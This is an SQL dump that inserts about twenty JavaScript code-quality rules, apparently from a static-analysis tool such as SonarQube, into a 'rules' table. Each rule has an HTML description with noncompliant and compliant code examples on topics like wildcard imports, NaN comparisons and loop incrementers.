INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1220, 'Wildcard imports should not be used', 'S2208', NULL, 'javascript', '<p>On the principle that clearer code is better code, you should explicitly <code>import</code> the things you want to use in a module. Using <code>import *</code> imports everything in the module, and runs the risk of confusing maintainers. Similarly, <code>export * from "module";</code> imports and then re-exports everything in the module, and runs the risk of confusing not just maintainers but also users of the module.</p>

<h2>Noncompliant Code Example</h2>
<pre>
import * as Imported from "aModule";  // Noncompliant
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'es2015,pitfall', false, 'HTML', 1510817813348, 1510817813348, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1216, '"for...in" loops should filter properties before acting on them', 'ForIn', NULL, 'javascript', '<p>The <code>for...in</code> in statement allows you to loop through the names of all of the properties of an object. Unfortunately, the list of properties includes all those properties that were inherited through the prototype chain. This has the bad side effect of serving up method functions when the interest is in data properties. Programs that don''t take this into account can fail.</p>
<p>Therefore, the body of every <code>for...in</code> statement should be wrapped in an <code>if</code> statement that filters which properties are acted upon. It can select for a particular type or range of values, or it can exclude functions, or it can exclude properties from the prototype. </p>
<h2>Noncompliant Code Example</h2>

<pre>
for (name in object) {
    doSomething(name);  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>

<pre>
for (name in object) {
  if (object.hasOwnProperty(name)) {
    doSomething(name);
  }
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813344, 1510817813344, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1217, '"future reserved words" should not be used as identifiers', 'FutureReservedWords', NULL, 'javascript', '<p>The following words may be used as keywords in future evolutions of the language, so using them as identifiers should be avoided to allow an easier adoption of those potential future versions:</p>
<ul>
<li> <code>await</code></li>
<li> <code>class</code></li>
<li> <code>const</code></li>
<li> <code>enum</code></li>
<li> <code>exports</code></li>
<li> <code>extends</code></li>
<li> <code>implements</code></li>
<li> <code>import</code></li>
<li> <code>interface</code></li>
<li> <code>let</code></li>
<li> <code>package</code></li>
<li> <code>private</code></li>
<li> <code>protected</code></li>
<li> <code>public</code></li>
<li> <code>static</code></li>
<li> <code>super</code></li>
<li> <code>yield</code></li>
</ul>
<p>Use of these words as identifiers would produce an error in JavaScript <code>strict</code> mode code.</p>
<h2>Noncompliant Code Example</h2>

<pre>
var package = document.getElementsByName("foo"); // Noncompliant
var someData = { package: true };                 // Compliant, as it is not used as an identifier here
</pre>
<h2>Compliant Solution</h2>

<pre>
var elements = document.getElementsByName("foo"); // Compliant
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'lock-in,pitfall', false, 'HTML', 1510817813345, 1510817813345, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1218, 'Assignments should not be made from within sub-expressions', 'AssignmentWithinCondition', NULL, 'javascript', '<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable.</p>
<p>It is also a common mistake to write <code>=</code> when <code>==</code> was meant.</p>
<p>Ideally, expressions should not have side-effects.</p>
<h2>Noncompliant Code Example</h2>

<pre>
doSomething(i = 42);
</pre>
<h2>Compliant Solution</h2>

<pre>
i = 42;
doSomething(i);   
// or
doSomething(i == 42);  // Perhaps in fact the comparison operator was expected
</pre>
<h2>Exceptions</h2>
<p>Assignments in <code>while</code> statement conditions, and assignments enclosed in relational expressions are allowed.</p>
<pre>
while ((line = nextLine()) != null) {...}  // Compliant

while (line = nextLine()) {...}  // Compliant

if (line = nextLine()) {...}  // Noncompliant
</pre><h2>See</h2>

<ul>
<li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value</li>
<li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions</li>
<li> MISRA C:2012, 13.4 - The result of of an assignment operator should not be used</li>
<li> <a href="http://cwe.mitre.org/data/definitions/481.html">MITRE, CWE-481</a> - Assigning instead of Comparing</li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cwe,misra', false, 'HTML', 1510817813346, 1510817813346, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1219, 'Function argument names should be unique', 'DuplicateFunctionArgument', NULL, 'javascript', '<p>Function arguments should all have different names to prevent any ambiguity. Indeed, if arguments have the same name, the last duplicated argument hides all the previous arguments with the same name. This hiding makes no sense, reduces understandability and maintainability, and obviously can be error prone. </p>
<h2>Noncompliant Code Example</h2>

<pre>
function compute(a, a, c) { // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>

<pre>
function compute(a, b, c) { // Compliant
}
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813347, 1510817813347, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1223, 'Multiline blocks should be enclosed in curly braces', 'S2681', NULL, 'javascript', '<p>Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be misleading and induce bugs. </p>
<p>This rule raises an issue when the indentation of the lines after a one-line block indicates an intent to include those lines in the block, but the omission of curly braces means the lines will be unconditionally executed once.</p>

<h2>Noncompliant Code Example</h2>
<pre>
if (condition)
  firstActionInBlock();
  secondAction();  // Noncompliant; executed unconditionally
thirdAction();

String str = null;
for (int i = 0; i &lt; array.length; i++) 
  str = array[i];
  doTheThing(str);  // Noncompliant; executed only on last array element
</pre>

<h2>Compliant Solution</h2>
<pre>
if (condition) {
  firstActionInBlock();
  secondAction();
}
thirdAction();

String str = null;
for (int i = 0; i &lt; array.length; i++) {
  str = array[i];
  doTheThing(str);
}
</pre>

<h2>See</h2>
<ul>
<li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation
</li></ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cwe', false, 'HTML', 1510817813351, 1510817813351, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1224, 'Generators should "yield" something', 'S3531', NULL, 'javascript', '<p>A generator without a <code>yield</code> statement is at best confusing, and at worst a bug in your code, since the iterator produced by your code will always be empty. </p>

<h2>Noncompliant Code Example</h2>
<pre>
function* myGen(a, b) {  // Noncompliant
  let answer = 0;
  answer += a * b;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
function* myGen(a, b) {
  let answer = 0;
  while (answer &lt; 42) {
    answer += a * b;
    yield answer;
  }
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'es2015,suspicious', false, 'HTML', 1510817813352, 1510817813352, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1225, 'Object literal shorthand syntax should be used', 'S3498', NULL, 'javascript', '<p>When an already-defined variable is given the same name within a new object, object-shorthand syntax is preferred as being more compact. Similarly, object-shorthand is also preferred for the definition of functions in object literals.</p>

<h2>Noncompliant Code Example</h2>
<pre>
let a = 1;

let myObj = {
  a : a,  // Noncompliant
  fun: function () {  // Noncompliant
    //...
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
let a = 1;

let myObj = {
  a,
  fun () {
    //...
  }
}
</pre>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention,es2015', false, 'HTML', 1510817813353, 1510817813353, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1226, 'Two branches in the same conditional structure should not have exactly the same implementation', 'S1871', NULL, 'javascript', '<p>
Having two <code>cases</code> in the same <code>switch</code> statement or branches in the same <code>if</code> structure  with the same implementation is at best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then they should be combined, for an <code>if</code> structure or one should fall through to the other for a <code>switch</code>.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
switch (i) {
  case 1:
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1''s implementation
    doSomething();
    break;
  default:
    doTheRest();
}

if (a >= 0 && a < 10) {
  doTheThing();
else if (a >= 10 && a < 20) {
  doTheOtherThing();
}
else if (a >= 20 && a < 50) {
  doTheThing();  // Noncompliant; duplicates first condition
}
else {
  doTheRest();
}
</pre>

<h2>Compliant Solution</h2>
<pre>
switch (i) {
  case 1:
  case 3:
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  default:
    doTheRest();
}

if ((a >= 0 && a < 10) || (a >= 20 && a < 50)) {
  doTheThing();
else if (a >= 10 && a < 20) {
  doTheOtherThing();
}
else {
  doTheRest();
}
</pre>

<p>or</p>

<pre>
switch (i) {
  case 1:
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:
    doThirdThing();
    break;
  default:
    doTheRest();
}

if (a >= 0 && a < 10) {
  doTheThing();
else if (a >= 10 && a < 20) {
  doTheOtherThing();
}
else if (a >= 20 && a < 50) {
  doTheThirdThing();
}
else {
  doTheRest();
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817813354, 1510817813354, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1227, '"import" should be used to include external code', 'S3533', NULL, 'javascript', '<p>Before ECMAScript 2015, module management had to be ad-hoc or provided by 3rd-party libraries such as Node.js, Webpack, or RequireJS. Fortunately, ES2015, provides language-standard mechanisms for module management, <code>import</code> and <code>export</code>, and older usages should be converted.</p>

<h2>Noncompliant Code Example</h2>
<pre>
// circle.js
exports.area = function (r) {
  return PI * r * r;
};

// foo.js
define(["./cart", "./horse"], function(cart, horse) {  // Noncompliant
  // ...
});

// bar.js
const circle = require(''./circle.js'');  // Noncompliant
</pre>

<h2>Compliant Solution</h2>
<pre>
// circle.js
let area = function (r) {
  return PI * r * r;
}
export default area;

// foo.js
import cart from "./cart.js";
import horse from "./horse.js";

// bar.js
import circle from "./circle.js"
</pre>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention,es2015,obsolete', false, 'HTML', 1510817813355, 1510817813355, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1228, '"arguments.caller" and "arguments.callee" should not be used', 'S2685', NULL, 'javascript', '<p>Both <code>arguments.caller</code> and <code>arguments.callee</code> make quite a few optimizations impossible so they were deprecated in latest versions of JavaScript. In fact, EcmaScript 5 forbids the use of both in <code>strict</code> mode, according to the docs:</p>
<blockquote>Arguments objects for strict mode functions define non-configurable accessor properties named "caller" and "callee" which throw a TypeError exception on access.</blockquote>
<p>The same restriction applies to the function''s <code>caller</code> and <code>arguments</code> properties in <code>strict</code> mode.</p>
<h2>Noncompliant Code Example</h2>

<pre>
function whoCalled() {
   if (arguments.caller == null)   //Noncompliant
      console.log(''I was called from the global scope.'');
   else
      console.log(arguments.caller + '' called me!'');  // Noncompliant

  console.log(whoCalled.caller);  // Noncompliant
  console.log(whoCalled.arguments);  // Noncompliant
}
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'obsolete', false, 'HTML', 1510817813356, 1510817813356, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1229, 'Shorthand object properties should be grouped at the beginning or end of an object declaration', 'S3499', NULL, 'javascript', '<p>Grouping all the shorthand declarations together in an object makes the declaration as a whole more readable. This rule accepts shorthand declarations grouped at either the beginning or end of an object.</p>

<h2>Noncompliant Code Example</h2>
<pre>
let obj1 = {
  foo,
  a: 1,
  color,  // Noncompliant
  b: 2,
  judyGarland  // Noncompliant
}
</pre>

<h2>Compliant Solution</h2>
<pre>
let obj1 = {
  foo,
  color,
  judyGarland,
  a: 1,
  b: 2
}
</pre>
<p>or </p>
<pre>
let obj1 = {
  a: 1,
  b: 2,
  foo,
  color,
  judyGarland
}
</pre>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention,es2015', false, 'HTML', 1510817813357, 1510817813357, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1230, '"NaN" should not be used in comparisons', 'S2688', NULL, 'javascript', '<p>
  <code>NaN</code> is not equal to anything, even itself. Testing for equality or inequality against <code>NaN</code> will yield predictable results, but probably not the ones you want.
</p>
<p>
  Instead, the best way to see whether a variable is equal to <code>NaN</code> is (perhaps counter-intuitively) to compare it to itself. Since <code>NaN !== NaN</code>, when <code>a !== a</code>, you know it must equal <code>NaN</code>.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var a = NaN;

if (a === NaN) {  // Noncompliant; always false
  console.log("a is not a number");  // this is dead code
}
if (a !== NaN) { // Noncompliant; always true
  console.log("a is not NaN"); // this statement is not necessarily true
}
</pre>

<h2>Compliant Solution</h2>
<pre>
if (a !== a) {
  console.log("a is not a number");
}
if (a === a) {
  console.log("a is not NaN");
}
</pre>', 4, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813358, 1510817813358, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1231, '"for" loop incrementers should modify the variable being tested in the loop''s stop condition', 'S1994', NULL, 'javascript', '<p>It is almost always an error when a <code>for</code> loop''s stop condition and incrementer don''t act on the same variable. Even when it is not, it could confuse future maintainers of the code, and should be avoided.</p>

<h2>Noncompliant Code Example</h2>
<pre>
for (i = 0; i &lt; 10; j++) {  // Noncompliant
  // ...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
for (i = 0; i &lt; 10; i++) {
  // ...
}
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817813359, 1510817813359, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1232, 'Comma operator should not be used', 'S878', NULL, 'javascript', '<p>The comma operator takes two expressions, executes them from left to right and returns the result of the second one. Use of this operator is generally detrimental to the readability and reliability of code, and the same effect can be achieved by other means.</p>
<h2>Noncompliant Code Example</h2>

<pre>
i = a += 2, a + b;  // What''s the value of i ?
</pre>
<h2>Compliant Solution</h2>

<pre>
a +=  2;
i = a + b;
</pre>
<h2>Exceptions</h2>

<p>Use of comma operator is tolerated in initialization and increment expressions of <code>for</code> loops.</p>
<pre>
for(i = 0, j = 5; i &lt; 6; i++, j++) { ... }
</pre>
<h2>See</h2>

<ul>
<li> MISRA C:2004, 12.10 - The comma operator shall not be used.</li>
<li> MISRA C++:2008, 5-18-1 - The comma operator shall not be used.</li>
<li> MISRA C:2012, 12.3 - The comma operator should not be used</li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'misra', false, 'HTML', 1510817813360, 1510817813360, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1233, 'Function parameters with default values should be last', 'S1788', NULL, 'javascript', '<p>The ability to define default values for function parameters can make a function easier to use. Default parameter values allow callers to specify as many or as few arguments as they want while getting the same functionality and minimizing boilerplate, wrapper code.</p>
<p>But all function parameters with default values should be declared after the function parameters without default values. Otherwise, it makes it impossible for callers to take advantage of defaults; they must re-specify the defaulted values or pass <code>undefined</code> in order to "get to" the non-default parameters.</p>

<h2>Noncompliant Code Example</h2>
<pre>
function multiply(a = 1, b) {  // Noncompliant
  return a*b;
}

var x = multiply(42);  // returns NaN as b is undefined
</pre>

<h2>Compliant Solution</h2>
<pre>
function multiply(b, a = 1) {
  return a*b;
}

var x = multiply(42);  // returns 42 as expected
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'es2015', false, 'HTML', 1510817813361, 1510817813361, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1234, '"strict" mode should be used with caution', 'StrictMode', NULL, 'javascript', '<p>
  Even thought it may be a good practice to enforce JavaScript strict mode, doing so could result in unexpected behaviors on browsers that do not support it yet. Using this feature should therefore be done with caution and with full knowledge of the potential consequences on browsers that do not support it.
</p>

<h2>Noncompliant Code Example</h2>

<pre>
function strict() {
  ''use strict'';
}
</pre>', 0, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cross-browser,user-experience', false, 'HTML', 1510817813362, 1510817813362, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1235, 'Property names should not be duplicated within an object literal', 'DuplicatePropertyName', NULL, 'javascript', '<p>
  JavaScript allows duplicate property names in object literals, but only the last instance of a duplicated property determines the actual value that will be used for it. Therefore, changing values of other occurrences of a duplicated property will have no effect and may cause misunderstandings and bugs.
</p>

<p>
  What''s more, using duplicate property names will generate an error in JavaScript strict mode code.
  The following code snippet illustrates this rule :
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var data = {
  "key": "value",
  "1": "value",
  "key": "value", // Noncompliant - duplicate of "key"
  ''key'': "value", // Noncompliant - duplicate of "key"
  key: "value", // Noncompliant - duplicate of "key"
  \u006bey: "value", // Noncompliant - duplicate of "key"
  "\u006bey": "value", // Noncompliant - duplicate of "key"
  "\x6bey": "value", // Noncompliant - duplicate of "key"
  1: "value" // Noncompliant - duplicate of "1"
}
</pre>

<h2>Compliant Solution</h2>
<pre>
var data = {
  "key": "value",
  "1": "value",
  "key2": "value",
  ''key3'': "value",
  key4: "value",
  \u006bey5: "value",
  "\u006bey6": "value",
  "\x6bey7": "value",
  1b: "value"
}
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813363, 1510817813363, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1236, '"new" operators should be used with functions', 'S2999', NULL, 'javascript', '<p>
  The <code>new</code> keyword should only be used with objects that define a constructor function. Use it with anything else, and you''ll get a <code>TypeError</code> because there won''t be a constructor function for the <code>new</code> keyword to invoke.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
function MyClass() {
  this.foo = ''bar'';
}

var someClass = 1;

var obj1 = new someClass;    // Noncompliant;
var obj2 = new MyClass();    // Noncompliant if considerJSDoc parameter set to true. Compliant when considerJSDoc=false
</pre>

<h2>Compliant Solution</h2>
<pre>
/**
 * @constructor
 */
function MyClass() {
  this.foo = ''bar'';
}

var someClass = function(){
  this.prop = 1;
}

var obj1 = new someClass;  // Compliant
var obj2 = new MyClass();  // Compliant regardless of considerJSDoc value
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817813364, 1510817813364, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1237, 'The global "this" object should not be used', 'S2990', NULL, 'javascript', '<p>
  When the keyword <code>this</code> is used outside of an object, it refers to the global <code>this</code> object,
  which is the same thing as the <code>window</code> object in a standard web page. Clearly, such a misdirected usage
  could have unintended consequences, as well as being confusing to maintainers. Instead, simply drop the <code>this</code>;
  it will have the same effect.
</p>

<h2>Noncompliant Code Example</h2>

<pre>
this.foo = 1;   // Noncompliant
console.log(this.foo); // Noncompliant

function MyObj() {
  this.foo = 1; // Compliant
}

MyObj.func1 = function() {
  if (this.foo == 1) { // Compliant
    // ...
  }
}
</pre>

<h2>Compliant Solution</h2>

<pre>
foo = 1;
console.log(foo);

function MyObj() {
  this.foo = 1;
}

MyObj.func1 = function() {
  if (this.foo == 1) {
    // ...
  }
}
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813365, 1510817813366, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1238, 'Increment (++) and decrement (--) operators should not be used in a method call or mixed with other operators in an expression', 'S881', NULL, 'javascript', '<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>
<ul>
  <li> It can significantly impair the readability of the code.
  </li><li> It introduces additional side effects into a statement, with the potential for undefined behavior.
</li><li> It is safer to use these operators in isolation from any other arithmetic operators.
</li></ul>

<h2>Noncompliant Code Example</h2>
<pre>
u8a = ++u8b + u8c--;
foo = bar++ / 4;
</pre>

<h2>Compliant Solution</h2>
<p>The following sequence is clearer and therefore safer:</p>
<pre>
++u8b;
u8a = u8b + u8c;
u8c--;
foo = bar / 4;
bar++;
</pre>

<h2>See</h2>
<ul>
  <li> MISRA C:2004, 12.1 - Limited dependence should be placed on the C operator precedence rules in expressions.
  </li><li> MISRA C:2004, 12.13 - The increment (++) and decrement (--) operators should not be mixed with other operators in an expression.
</li><li> MISRA C++:2008, 5-2-10 - The increment (++) and decrement (--) operator should not be mixed with other operators in an expression.
</li><li> MISRA C:2012, 12.1 - The precedence of operators within expressions should be made explicit
</li><li> MISRA C:2012, 13.3 - A full expression containing an increment (++) or decrement (--) operator should have no other potential side effects other than that cause by the increment or decrement operator
</li><li> <a href="https://www.securecoding.cert.org/confluence/x/ZwE">CERT, EXP30-C</a> -      Do not depend on the order of evaluation for side effects
</li><li> <a href="https://www.securecoding.cert.org/confluence/x/fYAyAQ">CERT, EXP30-CPP</a> - Do not depend on order of evaluation between sequence points
</li><li> <a href="https://www.securecoding.cert.org/confluence/x/yQC7AQ">CERT, EXP05-J</a> - Do not follow a write by a subsequent write or read of the same object within an expression
</li></ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,misra', false, 'HTML', 1510817813366, 1510817813367, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1239, 'A "while" loop should be used instead of a "for" loop', 'S1264', NULL, 'javascript', '<p>When only the condition expression is defined in a <code>for</code> loop, but the init and increment expressions are missing, a <code>while</code> loop should be used instead to increase readability. </p>

<h2>Noncompliant Code Example</h2>
<pre>
for (;condition;) { /*...*/ }
</pre>


<h2>Compliant Solution</h2>
<pre>
while (condition) { /*...*/ }
</pre>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813367, 1510817813368, 1);
